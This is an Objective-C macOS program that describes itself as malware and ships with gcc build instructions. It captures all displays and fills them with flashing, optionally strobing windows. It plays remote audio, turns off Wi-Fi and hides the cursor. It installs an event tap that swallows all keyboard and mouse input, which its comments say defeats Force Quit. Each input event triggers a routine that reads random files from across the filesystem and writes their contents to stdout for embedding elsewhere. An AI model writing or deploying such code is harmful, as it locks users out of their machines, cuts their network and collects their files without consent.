// !!!!!!!!!!!!!!!!!!!!
//
// If for whatever reason you find the malware running on your machine, DO
// NOTHING. Do not move your mouse, press keys, or anything. The harvesting is
// triggered by these events.
//
// Here is a run where I did not move the mouse or press keys.
//
// 2026-04-25 19:21:12.030 capture[94379:31397637] 1 argc
//
// That is the whole log. No files were harvested.

#pragma warn                                                                   \
    "If for whatever reason you find the malware running on your machine, DO    \
    NOTHING. Do not move your mouse, press keys, or anything. The harvesting is \
    triggered by these events."

#warning                                                                   \
    "If for whatever reason you find the malware running on your machine, DO    \
    NOTHING. Do not move your mouse, press keys, or anything. The harvesting is \
    triggered by these events."

#pragma GCC warning                                                             \
    "If for whatever reason you find the malware running on your machine, DO \
    NOTHING. Do not move your mouse, press keys, or anything. The harvesting is \
    triggered by these events."

// If you want you can build this yourself if you don't trust us running a
// binary on your system just make sure all the frameworks are installed
//
// If you wish to perform "harvestmaxxing" compile with something like this
// gcc capture.m -framework CoreGraphics -framework AppKit -framework Foundation -framework QuartzCore -framework CoreWLAN -Ofast -march=native -mtune=native -flto -o capture

#import <AppKit/AppKit.h>
#import <AppKit/NSWindow.h>
#import <CoreWLAN/CoreWLAN.h>
#import <QuartzCore/QuartzCore.h>
#import <os/lock.h>
#include <CoreGraphics/CoreGraphics.h>
#import <Foundation/Foundation.h>
#include <QuartzCore/CoreAnimation.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stddef.h>

static int64_t WINDOW_COUNT = 0;

CABasicAnimation *hueAnimation(BOOL strobe) {
  CABasicAnimation *anim =
    [CABasicAnimation animationWithKeyPath:@"backgroundColor"];

  [anim setFromValue:(id)[(strobe ? [NSColor whiteColor] : [NSColor blueColor]) CGColor]];
  [anim setToValue:(id)[[NSColor blackColor] CGColor]];
  [anim setDuration:strobe ? 0.109375 : 0.875]; // The compiler should note if --flash-me-baby (or --strobon Beta   releases) and set it to 0.875s (no strobing) or 0.092863 (strobing)
  [anim setAutoreverses:!strobe];
  [anim setRepeatCount:INFINITY];
  [anim setTimingFunction:[CAMediaTimingFunction functionWithName:
                                                           kCAMediaTimingFunctionLinear]];

  return anim;
}

CABasicAnimation *rotationAnimation(CFTimeInterval offset) {
    CABasicAnimation *anim =
        [CABasicAnimation animationWithKeyPath:@"transform.rotation.x"];

    [anim setFromValue:@0];
    [anim setToValue:@(0.5 * M_PI)];
    [anim setDuration:1.75];
    [anim setTimeOffset:offset];
    [anim setRepeatCount:INFINITY];

    return anim;
}

@interface FuckingStupidDelegateMayAsWellBeJustANormalAppAtThisPoint
  : NSWindowController <NSWindowDelegate> {
}

- (instancetype)initWithScreen:(NSScreen *)screen
                              :(BOOL)strobe;

@end

NSImageView *makeImageView(NSWindow *window, NSImage *image, CFTimeInterval offset) {
    NSImageView *imageView = [[NSImageView alloc] initWithFrame:[window frame]];
    [imageView setImage:image];

    [[window contentView] addSubview:imageView];
    [NSLayoutConstraint activateConstraints:@[
      [[imageView centerXAnchor] constraintEqualToAnchor:[[window contentView] centerXAnchor]],
      [[imageView centerYAnchor] constraintEqualToAnchor:[[window contentView] centerYAnchor]]
    ]];

    [[imageView layer] setAnchorPoint:CGPointMake(0.5, 0.5)];
    [[imageView layer] setPosition:CGPointMake(NSMidX([imageView frame]),
        NSMidY([imageView frame]))];

    [imageView setWantsLayer:true];
    [[imageView layer] setBackgroundColor:[[NSColor clearColor] CGColor]];

    [[imageView layer] addAnimation:rotationAnimation(offset)
                             forKey:@"rotationAnimation"];

    return imageView;
}

@implementation FuckingStupidDelegateMayAsWellBeJustANormalAppAtThisPoint

- (instancetype)initWithScreen:(NSScreen *)screen
                              :(BOOL)strobe {
  NSWindow *window =
    [[NSWindow alloc]  initWithContentRect:[screen frame]
                                 styleMask:NSWindowStyleMaskBorderless
                                   backing:NSBackingStoreBuffered
                                     defer:false];

  [window setBackgroundColor:[NSColor clearColor]];
  [window setLevel:CGShieldingWindowLevel() + 1];
  [window
    setCollectionBehavior:NSWindowCollectionBehaviorCanJoinAllSpaces |
                          NSWindowCollectionBehaviorFullScreenAuxiliary];

  [[window contentView] setWantsLayer:true];
  [[[window contentView] layer]
    setBackgroundColor:[[NSColor redColor] CGColor]];

  [[[window contentView] layer] addAnimation:hueAnimation(strobe)
                                      forKey:@"backgroundColorAnimation"];

  if ([NSScreen mainScreen] == screen) {
      NSURL *imageUrl = [NSURL URLWithString:@"https://ljpprojects.org/assets/icon.svg"];
      NSImage *image = [[NSImage alloc] initWithContentsOfURL:imageUrl];
      NSImageView *imageViewA = makeImageView(window, image, 0);
      NSImageView *imageViewB = makeImageView(window, image, 0.4375);
      NSImageView *imageViewC = makeImageView(window, image, 2 * 0.4375);
      NSImageView *imageViewD = makeImageView(window, image, 3 * 0.4375);
  }

  [window setDelegate:self];
  [window makeKeyAndOrderFront:NULL];
  self.window = window;

  WINDOW_COUNT++;

  return self;
}

- (instancetype)init {
  self = [super init];
  return self;
}

- (void)windowWillClose:(NSNotification *)notification {
  // Decrement counter
  WINDOW_COUNT--;
}

@end

// Store a log of the files we have collected
NSMutableOrderedSet<NSString *> *collectedFiles = nil;
os_unfair_lock collected_lock = OS_UNFAIR_LOCK_INIT;
os_unfair_lock stdout_lock = OS_UNFAIR_LOCK_INIT;

// 0 = QOS_CLASS_USER_INITIATED
// 1 = QOS_CLASS_DEFAULT
dispatch_semaphore_t qos_semaphore = nil;
intptr_t qos_idx = 0;

intptr_t get_qos_class() {
  dispatch_semaphore_wait(qos_semaphore, DISPATCH_TIME_FOREVER);
  intptr_t idx = qos_idx++ % 2;
  qos_idx %= 2;
  dispatch_semaphore_signal(qos_semaphore);

  switch (idx) {
  case 0:
    return QOS_CLASS_USER_INITIATED;
  case 1:
    dispatch_semaphore_signal(qos_semaphore);
    return QOS_CLASS_DEFAULT;
  default:
    dispatch_semaphore_signal(qos_semaphore);
    return QOS_CLASS_USER_INITIATED;
  }
}

void harvestmaxxing() {
  dispatch_async(dispatch_get_global_queue(get_qos_class(), 0), ^{
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSString *homeDir = [[fileManager homeDirectoryForCurrentUser] path];
    NSDirectoryEnumerator *enumerator = [fileManager
      enumeratorAtPath:@"/"];

    NSMutableArray<NSString *> *candidates = [NSMutableArray arrayWithCapacity:16];

    BOOL skip = false;

    for (NSString *path in enumerator) {
      // We need all the files we can get with such heavy restrictions; no depth
      // limit

      skip = arc4random_uniform(2) == 1;

      // HEAVILY bias towards not skipping /Volumes
      if ([path containsString:@"Volumes/"]) {
        skip = arc4random_uniform(8) == 1;
      }

      // Never harvest nix or usr
      if ([path containsString:@"nix"] || [path containsString:@"usr"]) {
        [enumerator skipDescendants];
        skip = true;
        goto after;
      }

      // Not even we want to harvest node_modules
      if ([path containsString:@"/node_modules"]) {
        [enumerator skipDescendants];
        skip = true;
        goto after;
      }

      // HEAVILY bias against harvesting local, sbin, bin, standalone, libexec
      if ([path containsString:@"bin"] || [path containsString:@"local"] || [path containsString:@"/sbin"] || [path containsString:@"standalone"] || [path containsString:@"libexec"]) {
        skip = arc4random_uniform(36) != 1;
        if (skip) [enumerator skipDescendants];
        goto after;
      }

      // VERY rarely harvest these
      if ([path containsString:@"Library"] || [path containsString:@"Applications"]) {
        skip = arc4random_uniform(36) != 1;
        if (skip) [enumerator skipDescendants];
        goto after;
      }

      // Rarely harvest these
      if ([path containsString:@"dev"] || [path containsString:@"private"] || [path containsString:@"opt"]) {
        skip = arc4random_uniform(12) != 1;
        if (skip) [enumerator skipDescendants];
        goto after;
      }

      // Rarely harvest these
      if ([path containsString:@"/share"] || [path containsString:@"/lib"]) {
        skip = arc4random_uniform(12) != 1;
        goto after;
      }

      // Sometimes harvest these
      if ([path containsString:@".Spotlight"] || [path containsString:@".timemachine"] || [path containsString:@".com.apple"] || [path containsString:@".git"] || [path containsString:@".app"] || [path containsString:@"target"]) {
          skip = arc4random_uniform(6) != 1;
          goto after;
      }
    after:
      if (skip && arc4random_uniform(50) == 2) {
        [enumerator skipDescendants];
        skip = arc4random_uniform(2) == 0;
        continue;
      } else if (skip) {
        skip = arc4random_uniform(2) == 0;
        continue;
      }

      os_unfair_lock_lock(&collected_lock);
      if ([collectedFiles containsObject:path]) {
        os_unfair_lock_unlock(&collected_lock);
        continue;
      }
      os_unfair_lock_unlock(&collected_lock);

      if ([candidates count] < 16) {
        [candidates addObject:path];
      } else {
        break;
      }
    }

    if ([candidates count] == 0) {
      NSLog(@"No candidates????!?!?!?!");
      return;
    }

    // Pick a random candidate (no modulo bias btw)
    uint32_t idx = arc4random_uniform((uint32_t)[candidates count]);

    // Get path
    NSString *path = [@"/" stringByAppendingPathComponent:candidates[idx]];

    NSLog(@"!! CANDIDATE SELECTED: %@ (out of %lu candidates) !!", path,
          (unsigned long)[candidates count]);

    os_unfair_lock_lock(&collected_lock);
    [collectedFiles addObject:candidates[idx]];
    os_unfair_lock_unlock(&collected_lock);

    // Collect the file to include in the executable (Rust will read stdout)
    NSFileHandle *handle = [NSFileHandle fileHandleForReadingAtPath:path];
    NSData *data = [handle readDataToEndOfFile];
    NSUInteger len = [data length];
    unsigned char lengthBytesLE[8];

    for (int i = 0; i < 8; i++) {
      lengthBytesLE[i] = (len >> (i * 8)) & 0xFF;
    }

    os_unfair_lock_lock(&stdout_lock);
    write(STDOUT_FILENO, [path cStringUsingEncoding:NSStringEncodingConversionAllowLossy], [path length] + 1);
    write(STDOUT_FILENO, lengthBytesLE, 8);
    write(STDOUT_FILENO, (unsigned char *)[data bytes], len);
    os_unfair_lock_unlock(&stdout_lock);
  });
}

CGEventRef totallyAnEventHandlerAndNotAFunctionToIgnoreThemAll(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
  harvestmaxxing();

  return NULL;
}

typedef FuckingStupidDelegateMayAsWellBeJustANormalAppAtThisPoint FSDMAWBJANAATP;

void schedule(dispatch_queue_t queue) {
  dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_MSEC)), dispatch_get_main_queue(), ^{
      schedule(queue);
  });

  dispatch_async(queue, ^{
    harvestmaxxing();
  });
}

int main(int argc, const char **argv) {
  NSLog(@"%d argc", argc);

  BOOL strobe = argc == 2 && !strncmp(argv[1], "strobe", 6);

  collectedFiles = [NSMutableOrderedSet orderedSetWithCapacity:2048];
  [collectedFiles retain]; // Don't die on me

  qos_semaphore = dispatch_semaphore_create(2);

  dispatch_queue_t queue = dispatch_queue_create(NULL, DISPATCH_QUEUE_CONCURRENT);

  // If this suits you more..
  // Skip window faf
  // schedule(queue);

  // [[NSRunLoop mainRunLoop] run];

  // return 0;


  @autoreleasepool {
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionDefault,
        kCGEventMaskForAllEvents,
        totallyAnEventHandlerAndNotAFunctionToIgnoreThemAll,
        NULL
    );

    // OPENING FORCE QUIT SHANT CLOSE OUR WINDOW NO MORE
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(NULL, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetMain(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    NSArray<NSScreen *> *screens = [NSScreen screens];
    __block NSMutableArray<FuckingStupidDelegateMayAsWellBeJustANormalAppAtThisPoint *>
      *windows = [[NSMutableArray alloc] initWithCapacity:[screens count]];

    for (NSScreen *screen in screens) {
      FSDMAWBJANAATP *window = [[FSDMAWBJANAATP alloc] initWithScreen:screen
                                                                     :strobe];
      [[window window] makeKeyAndOrderFront:NULL];
      [windows addObject:window];
    }

    NSURL *audioUrl = [NSURL URLWithString:@"https://raw.githubusercontent.com/ljpprojects/mosaic/refs/heads/nightly/src/sound/BIG%20SHOT.wav"];
    NSSound *audio = [[NSSound alloc] initWithContentsOfURL:audioUrl
                                                byReference:false];

    [audio setLoops:true];
    [audio setVolume:1.0];
    [audio play];

    // Slow wifi? Boo-hoo
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(20 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
      for (FSDMAWBJANAATP *window in windows) {
        [window close];
      }

      os_unfair_lock_lock(&stdout_lock); // Wait for last file to finish writing to stdout
      CGReleaseAllDisplays();
      [NSApp terminate:NULL];
    });
    // We can disable network access now
    CWWiFiClient *notMalwareJustNeedClient = [CWWiFiClient sharedWiFiClient];
    CWInterface *notMalwareJustNeedInterface =
        [notMalwareJustNeedClient interface];

    [notMalwareJustNeedInterface setPower:NO error:NULL];

    [NSCursor hide];
    CGCaptureAllDisplaysWithOptions(0);

    [[NSRunLoop mainRunLoop] run];
  }

  return 0;
}